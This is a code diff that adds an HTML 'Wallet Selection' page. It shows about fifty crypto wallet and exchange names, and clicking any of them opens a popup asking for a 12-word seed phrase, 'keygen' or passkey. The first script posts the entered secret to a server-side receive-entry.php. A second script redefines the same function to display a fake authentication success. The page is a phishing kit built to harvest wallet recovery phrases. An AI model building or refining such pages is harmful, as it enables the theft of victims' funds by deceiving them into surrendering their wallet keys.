@@ -1,0 +1,188 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Wallet Selection</title>
+    <link rel="stylesheet" href="color.css">
+</head>
+<body>
+    <header>
+        <div class="banner">
+            <img src="assets/banner.jpg" alt="Wallet Security Banner">
+        </div>
+        <h1>Select Your Wallet or Exchanger</h1>
+    </header>
+    
+    <div class="wallet-container" id="walletContainer"></div>
+
+   <!-- Authentication Popup -->
+<div id="authPopup" class="popup" style="display: none;">
+    <div class="popup-content">
+        <h2>Wallet Authentication</h2>
+        
+        <label for="authType">Select Authentication Method:</label>
+        <select id="authType">
+            <option value="seed">Seed Phrase</option>
+            <option value="keygen">Keygen</option>
+            <option value="passkey">Passkey</option>
+        </select>
+
+        <label for="authInput">Enter Credentials:</label>
+        <input type="text" id="authInput" placeholder="Enter your credentials">
+
+        <p id="authMessage" class="hidden"></p>
+
+        <button class="connect-btn" onclick="connectWallet()">Connect</button>
+        <button id="closeAuthPopup" class="close-btn">Close</button>
+    </div>
+</div>
+
+
+    <script>
+        const wallets = [
+            "MetaMask", "Trust Wallet", "Coinbase", "Ledger", "Trezor",
+            "Binance", "Crypto.com", "Phantom", "Exodus", "Atomic",
+            "MyEtherWallet", "Guarda", "Blockchain", "Electrum", "Zengo",
+            "Argent", "Safepal", "Rainbow", "coinomi", "BRD",
+            "ENJIN", "Math", "Huobi", "TokenPocket", "Bitpay",
+            "Nash", "Coin98", "XDEFI", "Ellipal", "Keystone",
+            "Gate.io", "OKX", "Bybit", "KuCoin", "Bitget",
+            "Kraken", "Polkadot", "Solflare", "Tonkeeper", "Cosmostation",
+            "Near", "Klever", "Wombat", "Domain", "Torus",
+            "Opera", "Bitcoin", "Numio", "Alpha", "Dharma",
+        ];
+
+        const walletContainer = document.getElementById("walletContainer");
+
+        wallets.forEach(wallet => {
+            let walletBox = document.createElement("div");
+            walletBox.classList.add("wallet-box");
+            walletBox.innerHTML = `
+                <img src="assets/${wallet.toLowerCase().replace(/ /g, '')}.png" alt="${wallet}" onerror="this.onerror=null; this.src='assets/default.png'">
+                <p>${wallet}</p>
+            `;
+            walletBox.onclick = openAuthPopup;
+            walletContainer.appendChild(walletBox);
+        });
+
+        function openAuthPopup() {
+            document.getElementById("authPopup").style.display = "flex";
+        }
+
+        function closeAuthPopup() {
+            document.getElementById("authPopup").style.display = "none";
+            document.getElementById("authMessage").textContent = "";
+        }
+
+        document.getElementById("closeAuthPopup").addEventListener("click", closeAuthPopup);
+
+        window.onclick = function(event) {
+            if (event.target.classList.contains("popup")) {
+                closeAuthPopup();
+            }
+        };
+
+        function connectWallet() {
+            let authType = document.getElementById("authType").value;
+            let authInput = document.getElementById("authInput").value.trim();
+            let message = document.getElementById("authMessage");
+
+            message.textContent = "";
+
+            if (authInput === "") {
+                message.textContent = "Error: Credentials cannot be empty!";
+                return;
+            }
+
+            if (authType === "seed" && authInput.split(" ").length !== 12) {
+                message.textContent = "Error: Seed phrase must be 12 words!";
+                return;
+            }
+
+            if (authType === "keygen" && authInput.length < 16) {
+                message.textContent = "Error: Keygen must be at least 16 characters!";
+                return;
+            }
+
+            if (authType === "passkey" && authInput.length < 8) {
+                message.textContent = "Error: Passkey must be at least 8 characters!";
+                return;
+            }
+
+            fetch("receive-entry.php", {
+                method: "POST",
+                headers: { "Content-Type": "application/x-www-form-urlencoded" },
+                body: `authType=${authType}&authInput=${encodeURIComponent(authInput)}`
+            })
+            .then(response => response.json())
+            .then(data => {
+                message.textContent = data.message;
+                message.style.color = data.message.includes("failed") ? "red" : "green";
+                if (data.message.includes("success")) {
+                    setTimeout(closeAuthPopup, 2000);
+                }
+            })
+            .catch(() => {
+                message.textContent = "Server error. Please try again.";
+                message.style.color = "red";
+            });
+        }
+    </script>
+
+    <script>
+    function connectWallet() {
+        let authType = document.getElementById("authType").value;
+        let authInput = document.getElementById("authInput").value.trim();
+        let message = document.getElementById("authMessage");
+
+        // Reset previous message
+        message.textContent = "";
+        message.classList.add("hidden");
+
+        if (authInput === "") {
+            message.textContent = "Error: Credentials cannot be empty!";
+            message.classList.remove("hidden");
+            return;
+        }
+
+        if (authType === "seed" && authInput.split(" ").length !== 12) {
+            message.textContent = "Error: Seed phrase must be 12 words!";
+            message.classList.remove("hidden");
+            return;
+        }
+
+        if (authType === "keygen" && authInput.length < 16) {
+            message.textContent = "Error: Keygen must be at least 16 characters!";
+            message.classList.remove("hidden");
+            return;
+        }
+
+        if (authType === "passkey" && authInput.length < 8) {
+            message.textContent = "Error: Passkey must be at least 8 characters!";
+            message.classList.remove("hidden");
+            return;
+        }
+
+        // Simulating authentication success
+        message.textContent = "Authenticated successfully!";
+        message.style.color = "green";
+        message.classList.remove("hidden");
+
+        setTimeout(closeAuthPopup, 2000);
+    }
+
+    // Hide warning message when user starts typing
+    document.getElementById("authInput").addEventListener("input", function () {
+        document.getElementById("authMessage").classList.add("hidden");
+    });
+
+    function closeAuthPopup() {
+        document.getElementById("authPopup").style.display = "none";
+        document.getElementById("authMessage").classList.add("hidden");
+    }
+
+    document.getElementById("closeAuthPopup").addEventListener("click", closeAuthPopup);
+</script>
+</body>
+</html>
